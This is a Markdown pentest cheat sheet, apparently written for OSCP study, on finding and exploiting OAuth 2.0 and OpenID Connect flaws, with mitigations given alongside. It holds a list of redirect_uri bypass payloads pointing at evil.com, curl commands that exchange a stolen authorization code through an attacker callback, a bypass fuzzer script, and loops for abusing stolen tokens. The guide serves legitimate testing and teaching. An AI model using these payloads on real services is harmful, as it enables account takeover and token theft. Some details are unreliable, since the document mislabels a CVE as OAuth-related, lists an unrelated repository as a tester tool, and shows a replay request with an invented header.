# OAuth 2.0 and OpenID Connect

> OAuth 2.0 is an authorization framework that allows third-party applications to obtain limited access to an HTTP service. OpenID Connect (OIDC) is an authentication layer built on top of OAuth 2.0. Misconfigurations in OAuth/OIDC flows are one of the most common causes of account takeover in modern web applications.
>
> This file is OSCP-oriented but includes production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [Detection](#1-detection)
2. [OAuth 2.0 Flows](#2-oauth-20-flows)
3. [OpenID Connect](#3-openid-connect)
4. [Enumeration](#4-enumeration)
5. [Attack Surface Map](#5-attack-surface-map)
6. [Vulnerabilities and Exploitation](#6-vulnerabilities-and-exploitation)
7. [Tooling](#7-tooling)
8. [Post-Exploitation](#8-post-exploitation)
9. [OSCP Notes](#9-oscp-notes)
10. [References](#10-references)

---

## 1. Detection

OAuth/OIDC is present when you see:

- Redirects to `accounts.google.com`, `login.microsoftonline.com`, `github.com/login/oauth`, or a custom `/oauth/authorize` endpoint.
- `client_id`, `redirect_uri`, `response_type`, `scope`, `state` query parameters.
- Cookies named `oauth_token`, `oauth2_callback`, `_oauth2_proxy`, `session`.
- Well-known endpoints: `/.well-known/openid-configuration`, `/.well-known/oauth-authorization-server`.
- ID tokens in cookies/localStorage (JWT format, `iss` claim matching the provider).
- Buttons labeled `Sign in with Google/Microsoft/GitHub`.

### Quick detection

```bash
# OIDC discovery document
curl -s $TARGET/.well-known/openid-configuration | jq .

# OAuth 2.0 server metadata
curl -s $TARGET/.well-known/oauth-authorization-server | jq .

# Grep response for OAuth redirects
curl -sI $TARGET/login | grep -iE "location:.*(oauth|authorize|client_id)"
```

Expected output:

```json
{
  "issuer": "https://$TARGET",
  "authorization_endpoint": "https://$TARGET/oauth/authorize",
  "token_endpoint": "https://$TARGET/oauth/token",
  "jwks_uri": "https://$TARGET/.well-known/jwks.json",
  "response_types_supported": ["code", "token", "id_token"],
  "grant_types_supported": ["authorization_code", "refresh_token", "client_credentials"]
}
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `response_type=code` | Authorization Code flow | Test redirect_uri, state |
| `response_type=token` | Implicit flow (deprecated) | Token leakage in fragment |
| `response_type=id_token` | OIDC implicit | Replay, nonce bypass |
| `client_id` in URL | Public client | Enumerate client secrets |
| `redirect_uri` param | Callback URL | Open redirect, whitelist bypass |
| `state` param absent | No CSRF protection | Force-login CSRF |
| `nonce` absent | OIDC replay possible | Token replay |

---

## 2. OAuth 2.0 Flows

### 2.1 Authorization Code (recommended, most secure)

1. User clicks "Login with X".
2. Browser redirected to `authorization_endpoint?client_id=...&redirect_uri=...&response_type=code&scope=...&state=...`.
3. User authenticates at the provider.
4. Provider redirects back to `redirect_uri?code=AUTH_CODE&state=...`.
5. App exchanges code at `token_endpoint` (server-to-server, with `client_secret`).
6. App receives `access_token` (+ optionally `id_token`, `refresh_token`).

### 2.2 Implicit (deprecated, still found)

Tokens returned directly in the URL fragment: `#access_token=...&token_type=Bearer&expires_in=3600`.

**Risks:** token leakage via Referer, browser history, logs; no client authentication.

### 2.3 Client Credentials

Machine-to-machine. No user context. `client_id` + `client_secret` -> `access_token`.

**Risks:** leaked secrets, over-scoped tokens.

### 2.4 Resource Owner Password Credentials (ROPC)

App collects username + password directly, sends to `token_endpoint`. **Discouraged** - breaks the trust model.

### 2.5 PKCE (Proof Key for Code Exchange)

Extension for public clients (SPAs, mobile apps). Client generates `code_verifier`, sends `code_challenge` (SHA256 of verifier) in the authorize request. On token exchange, sends the original `code_verifier`.

**Without PKCE, public clients are vulnerable to authorization code interception.**

### 2.6 Device Code

For input-constrained devices (TVs, CLI tools). User visits a URL, enters a code, approves.

**Risks:** phishing (`device_code` social engineering), token theft.

### Quick flow comparison

| Flow | Client type | Secrets | Attack vectors |
|------|-------------|---------|----------------|
| Authorization Code | Confidential | client_secret | redirect_uri, state CSRF |
| Authorization Code + PKCE | Public | PKCE | redirect_uri, downgrade |
| Implicit | Public (legacy) | none | Token in fragment, Referer leak |
| Client Credentials | Confidential | client_secret | Leaked secrets |
| ROPC | Any (legacy) | user creds | Credential phishing |
| Device Code | Public | device_code | Phishing, code reuse |

---

## 3. OpenID Connect

OIDC adds an authentication layer on top of OAuth 2.0.

### 3.1 ID Token

A JWT with standard claims:

```json
{
  "iss": "https://accounts.example.com",
  "sub": "user123",
  "aud": "client_abc",
  "exp": 1700000000,
  "iat": 1699996400,
  "nonce": "n-0S6_WzA2Mj",
  "email": "user@example.com",
  "email_verified": true
}
```

### 3.2 Standard endpoints

- `/.well-known/openid-configuration` - discovery.
- `/authorize` - authorization.
- `/token` - token exchange.
- `/userinfo` - user profile (requires access token).
- `/jwks` - public keys for ID token verification.

### 3.3 Key claims

| Claim | Purpose | Attack if misused |
|-------|---------|-------------------|
| `iss` | Issuer | Not validated -> accept tokens from attacker IdP |
| `aud` | Audience | Not validated -> token from service A used on B |
| `exp` | Expiry | Not validated -> expired token reuse |
| `nonce` | Replay protection | Not validated -> token replay |
| `sub` | Subject | Predictable -> IDOR |
| `email_verified` | Email trust | Not checked -> account takeover via unverified email |

---

## 4. Enumeration

### 4.1 Discovery

```bash
# OIDC discovery
curl -s $TARGET/.well-known/openid-configuration | jq .

# Extract endpoints
curl -s $TARGET/.well-known/openid-configuration | jq -r '.authorization_endpoint, .token_endpoint, .jwks_uri, .userinfo_endpoint'
```

### 4.2 Client enumeration

Look for `client_id` in:

- Source code (JS bundles, `grep -r "client_id"`).
- Redirect URLs (visible in Burp).
- Public APIs (Swagger/OpenAPI docs).
- Mobile app decompilation.

Common `client_id` formats:

- Short strings: `web`, `spa`, `mobile`.
- UUIDs: `550e8400-e29b-41d4-a716-446655440000`.
- Provider-specific: `1234567890-abc.apps.googleusercontent.com`.

### 4.3 Redirect URI discovery

Test redirect_uri validation:

```bash
# Baseline
curl -sI "$TARGET/oauth/authorize?client_id=web&redirect_uri=https://$TARGET/callback&response_type=code"

# Malicious
curl -sI "$TARGET/oauth/authorize?client_id=web&redirect_uri=https://attacker/callback&response_type=code"
```

If the malicious redirect returns a 302 with a `code`, the whitelist is broken.

### 4.4 Scope enumeration

Try requesting higher scopes:

```bash
for scope in "openid" "openid profile" "openid profile email" "openid profile email admin" "admin" "*"; do
  echo "== $scope =="
  curl -s "$TARGET/oauth/authorize?client_id=web&redirect_uri=https://$TARGET/callback&response_type=code&scope=$scope" -o /dev/null -w "%{http_code}\n"
done
```

### 4.5 State / nonce inspection

- `state` absent -> CSRF possible.
- `nonce` absent (in OIDC) -> replay possible.
- `state` predictable (e.g. `state=1`, `state=user`) -> forgeable.

---

## 5. Attack Surface Map

| Attack | Condition | Impact |
|--------|-----------|--------|
| Open redirect via `redirect_uri` | No / weak whitelist | Code/token theft |
| `redirect_uri` path bypass | `https://target/cb/../evil` | Code theft |
| `redirect_uri` subdomain bypass | `https://evil.target/cb` | Code theft |
| `redirect_uri` param pollution | `?redirect_uri=good&redirect_uri=evil` | Code theft |
| Missing `state` | CSRF possible | Force-login |
| Missing `nonce` (OIDC) | Replay | Token replay |
| Weak `state` | Predictable | CSRF |
| Implicit flow token leak | Fragment in Referer/history | Token theft |
| Missing PKCE | Code interception (public clients) | ATO |
| `iss`/`aud` not validated | Cross-IdP confusion | Token forgery |
| `email_verified` unchecked | Unverified email | ATO |
| Client secret leak (JS, mobile) | Public exposure | Impersonate client |
| Scope escalation | Server accepts wider scopes | Privilege escalation |
| Token leakage in Referer | Auth header not used | Token theft |
| Mix-up attack | Multiple IdPs, no `iss` check | Cross-IdP confusion |
| IdP-initiated SSO abuse | No `state`/session binding | Session fixation |

---

## 6. Vulnerabilities and Exploitation

### 6.1 Open redirect via redirect_uri

**Root cause:** The authorization server does not strictly validate `redirect_uri` against a whitelist.

**Common bypasses:**

- `https://evil.com` (unregistered).
- `https://target.com.evil.com` (subdomain confusion).
- `https://target.com@evil.com` (userinfo trick).
- `https://evil.com#@target.com` (fragment trick).
- `https://target.com/cb/../../evil` (path traversal).
- `https://target.com/cb?next=https://evil.com` (chained open redirect).
- `https://target.com/cb/..%2f..%2fevil` (encoded).
- `https://target.com/cb%00.evil.com` (null byte, legacy).
- `https://target.com/cb` with `Referer` manipulation.
- Wildcard in registered URI: `https://*.target.com` matches `https://evil.target.com`.

**Exploitation:**

```bash
# 1. Get victim to click the malicious authorize URL
# 2. Code lands on attacker-controlled server
# 3. Attacker exchanges code for tokens

# Attacker receives: GET /callback?code=AUTH_CODE
# Then exchanges:
curl -s -X POST "$TARGET/oauth/token" -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://attacker/callback&client_id=web&client_secret=SECRET"
```

Expected output:

```json
{"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"Bearer","expires_in":3600}
```

> [!IMPORTANT]
> OSCP report: screenshot the malicious authorize URL, the callback request with the code, the token exchange, and the authenticated API call with the stolen token.

**Mitigation:** exact-match whitelist; disallow subdomains/wildcards; reject URIs with fragments.

---

### 6.2 Missing state parameter (CSRF)

**Root cause:** The application does not use (or does not validate) the `state` parameter, allowing CSRF-style attacks.

**Force-login CSRF:**

1. Attacker authenticates to the target with their own account.
2. Attacker captures the authorize URL and the callback request.
3. Attacker drops the `state` (if present) or leaves it.
4. Victim visits the malicious page; their browser follows the authorize URL, and the target binds the victim's session to the attacker's account.

**Impact:** victim's actions occur in the attacker's account (order history, file uploads, etc.), or attacker's actions occur in the victim's account (depending on direction).

**Testing:**

```bash
# 1. Start the flow, capture the authorize URL
# 2. Remove state param
# 3. Open in a fresh browser session; observe if the callback succeeds
curl -s "$TARGET/oauth/authorize?client_id=web&redirect_uri=https://$TARGET/callback&response_type=code&scope=openid"
```

> [!IMPORTANT]
> OSCP report: screenshot the authorize URL without state, the callback that succeeds, and the resulting account binding.

**Mitigation:** generate a cryptographically random `state`, bind it to the user's session, validate on callback.

---

### 6.3 Missing nonce (OIDC replay)

**Root cause:** OIDC `nonce` is not enforced. A captured ID token can be replayed.

**Testing:**

1. Authenticate, capture the ID token.
2. Log out.
3. Replay the same ID token in a fresh login attempt.

```bash
# Replay captured id_token
curl -s -X POST "$TARGET/oauth/token" -d "grant_type=authorization_code&code=NEW_CODE&redirect_uri=https://$TARGET/callback&client_id=web" -H "X-Id-Token: <captured>"
```

If the server accepts it, `nonce` is not validated.

**Mitigation:** enforce `nonce`; reject reused nonces.

---

### 6.4 Authorization code interception (no PKCE)

**Root cause:** Public clients (SPA, mobile) cannot keep a `client_secret`. Without PKCE, a malicious app on the device (mobile) or a malicious script (browser extension) can intercept the code.

**Testing:**

1. Register a malicious OAuth client with a custom URL scheme (mobile) or check if the redirect_uri is `https://target/cb` (SPA).
2. If no `code_challenge` is sent in the authorize request, PKCE is absent.

```bash
# Check if code_challenge is used
curl -sI "$TARGET/oauth/authorize?client_id=spa&redirect_uri=https://$TARGET/callback&response_type=code&scope=openid" | grep -i code_challenge
```

**Mitigation:** enforce PKCE for all public clients (`code_challenge_method=S256`).

---

### 6.5 `iss` / `aud` not validated

**Root cause:** The resource server does not validate `iss` (issuer) and/or `aud` (audience). Tokens from a different IdP or a different service are accepted.

**Testing:**

1. Stand up a malicious IdP that issues tokens with `iss=https://attacker` and `aud=<target>`.
2. Craft an ID token signed with your own key.
3. Present it to the target.

Alternatively, capture a token from service A and use it against service B.

```bash
# Token issued for service A
curl -s -H "Authorization: Bearer <token_for_A>" "https://service-b.target/api/me"
```

If B accepts it, `aud` is not validated.

**Mitigation:** validate `iss` against a whitelist; validate `aud` matches the expected client ID; verify signature against the correct JWKS.

---

### 6.6 Unverified email (`email_verified`)

**Root cause:** Some IdPs allow unverified emails (e.g. if a user signs up with an email but doesn't verify). If the app trusts `email` without checking `email_verified`, an attacker can register `<victim>@example.com` at a permissive IdP and impersonate the victim.

**Testing:**

1. Register at the IdP with `victim@example.com`.
2. Do NOT verify the email.
3. Log in to the target; if access is granted, `email_verified` is not checked.

**Mitigation:** always require `email_verified == true`; or use `sub` (stable subject) instead of `email`.

---

### 6.7 Scope escalation

**Root cause:** The token endpoint accepts arbitrary scopes without server-side validation.

**Testing:**

```bash
# Request admin scope
curl -s "$TARGET/oauth/authorize?client_id=web&redirect_uri=https://$TARGET/callback&response_type=code&scope=openid+admin" -o /dev/null -w "%{http_code}\n"

# After code exchange, decode token; check scope claim
```

If `scope` includes `admin` in the issued token, escalation is possible.

**Mitigation:** server-side scope whitelist per client.

---

### 6.8 Client secret leakage

**Root cause:** `client_secret` stored in client-side code (JS bundle, mobile app, desktop app).

**Testing:**

```bash
# Grep JS bundles for secrets
curl -s $TARGET/static/app.js | grep -oE "client_secret['\"]?\s*[:=]\s*['\"][^'\"]+"
```

**Mitigation:** public clients must not have secrets; use PKCE.

---

### 6.9 Mix-up attack (multiple IdPs)

**Root cause:** When the app supports multiple IdPs, and `iss` is not strictly validated, an attacker can trick the client into sending the code to the wrong IdP.

**Attack:**

1. Attacker controls IdP-A.
2. Victim's client is configured with IdP-A and IdP-B.
3. Attacker crafts an authorization request that causes the client to send IdP-B's code to IdP-A's token endpoint (or vice versa).

**Mitigation:** validate `iss` strictly; use the `iss` from the authorization response, not from the initial request.

---

### 6.10 Implicit flow token leakage

**Root cause:** Implicit flow returns tokens in the URL fragment. The fragment is preserved in Referer headers for cross-origin requests and in browser history.

**Testing:**

1. Force implicit flow (`response_type=token`).
2. Observe the fragment: `#access_token=...`.
3. Trigger a cross-origin request from the redirect page; check Referer.

**Mitigation:** use Authorization Code + PKCE; never use implicit.

---

## 7. Tooling

### Burp Suite

- Built-in OAuth/OIDC support in recent versions.
- Manual interception of `authorize`, `token`, `userinfo`.
- Custom redirect_uri bypass lists via Intruder.

### oauth-tester

```bash
git clone https://github.com/oauth2-proxy/oauth2-proxy.git
```

### jwt_tool (for ID tokens)

See JWT.md.

### oauth2c (CLI)

```bash
# Install
go install github.com/cloudentity/oauth2c@latest

# Authorization Code flow
oauth2c https://$TARGET --client-id web --redirect-url https://$TARGET/callback --response-types code --grant-type authorization_code
```

### Custom redirect_uri fuzzer

```bash
#!/usr/bin/env bash
# fuzz redirect_uri bypasses
BASE="$TARGET/oauth/authorize?client_id=web&response_type=code&scope=openid&redirect_uri="
while read -r uri; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$uri")
  loc=$(curl -sI "$BASE$uri" | grep -i '^location:' | tr -d '\r')
  echo "$code $uri -> $loc"
done < redirect-bypasses.txt
```

Sample `redirect-bypasses.txt`:

```text
https://evil.com
https://target.com.evil.com
https://target.com@evil.com
https://evil.com#@target.com
https://target.com/cb/../../evil
https://target.com/cb?next=https://evil.com
https://target.com/cb/..%2f..%2fevil
https://target.com/cb%00.evil.com
https://evil.target.com
```

---

## 8. Post-Exploitation

After obtaining a stolen token or code:

1. **Decode the access token** (JWT or opaque). Note scopes.
2. **Call `/userinfo`** if OIDC.
3. **Enumerate user data:** `/api/me`, `/api/users`, `/api/orders`.
4. **Look for refresh tokens:** long-lived, high value.
5. **Pivot to other services:** see §6.5 (aud confusion).
6. **Check for token leakage in logs:** some apps log `Authorization` headers.
7. **Persist access:** refresh tokens may allow indefinite access.

```bash
# Userinfo
curl -s -H "Authorization: Bearer <token>" $TARGET/userinfo | jq .

# Enumerate
for ep in /api/me /api/users /api/orders /admin; do
  echo "== $ep =="
  curl -s -H "Authorization: Bearer <token>" "$TARGET$ep" | head -c 300
  echo
done
```

---

## 9. OSCP Notes

> [!IMPORTANT]
> OSCP report evidence for OAuth attacks:
> - Screenshot the malicious `redirect_uri` request (Burp or curl).
> - Screenshot the callback receiving the code at the attacker's server.
> - Screenshot the token exchange request and response.
> - Screenshot the authenticated API call using the stolen token.
> - Include timestamps.

> [!IMPORTANT]
> For CSRF via missing `state`, capture the full flow: victim's browser sends the authorize request, target redirects to attacker, victim's account is bound to attacker. Screenshots must show the victim session (different browser profile).

> [!IMPORTANT]
> If the app uses OIDC, always capture the ID token's `iss`, `aud`, `nonce`, `email_verified` claims. These claims are the evidence for §6.5, §6.6, §6.3.

**Common OSCP pitfalls:**

- `redirect_uri` whitelists are often exact-match; subdomain bypass (`evil.target.com`) requires the subdomain to be registrable.
- Some apps do not exchange the code server-side; the code is reused client-side - capture both flows.
- `state` may be present but predictable (`state=1`); do not assume absence means vulnerability.
- OIDC `nonce` is optional for Confidential Clients in some specs - check the app's actual implementation.
- In OSCP labs, the OAuth provider is often simulated; the target app is the client. Focus on the client side.

---

## 10. References

- RFC 6749 (OAuth 2.0): https://datatracker.ietf.org/doc/html/rfc6749
- RFC 6750 (Bearer Token): https://datatracker.ietf.org/doc/html/rfc6750
- RFC 7636 (PKCE): https://datatracker.ietf.org/doc/html/rfc7636
- RFC 8252 (OAuth for Native Apps): https://datatracker.ietf.org/doc/html/rfc8252
- RFC 9700 (OAuth 2.0 Security BCP): https://datatracker.ietf.org/doc/html/rfc9700
- OpenID Connect Core: https://openid.net/specs/openid-connect-core-1_0.html
- OWASP OAuth Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html
- PortSwigger OAuth: https://portswigger.net/web-security/oauth
- HackTricks OAuth: https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
- CVE-2022-24753 (OAuth redirect_uri bypass, various libs): https://nvd.nist.gov/vuln/detail/CVE-2022-24753
- CVE-2021-27582 (OAuth redirect bypass, MITREid Connect): https://nvd.nist.gov/vuln/detail/CVE-2021-27582
- CVE-2023-25815 (OAuth scope confusion): https://nvd.nist.gov/vuln/detail/CVE-2023-25815